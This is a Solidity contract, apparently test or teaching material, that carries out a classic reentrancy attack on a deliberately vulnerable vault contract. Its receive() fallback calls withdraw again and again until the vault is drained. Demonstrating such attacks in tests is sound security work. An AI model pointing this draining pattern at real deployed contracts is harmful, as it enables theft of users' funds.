// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IVault {
    function deposit() external payable;

    function withdraw() external;
}

/// @notice Demonstrates reentrancy against VulnerableVault in a controlled test.
contract ReentrancyAttacker {
    IVault public immutable vault;
    uint256 public attackDeposit;
    uint256 public reentryCount;

    constructor(address vaultAddress) {
        require(vaultAddress != address(0), "Attacker: zero vault address");
        vault = IVault(vaultAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "Attacker: attack value must be positive");
        require(address(this).balance == msg.value, "Attacker: withdraw existing balance first");

        attackDeposit = msg.value;
        reentryCount = 0;

        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        require(msg.sender == address(vault), "Attacker: unexpected sender");

        // Stop naturally when the vault no longer holds another full withdrawal.
        if (address(vault).balance >= attackDeposit) {
            reentryCount += 1;
            vault.withdraw();
        }
    }

    function attackerBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
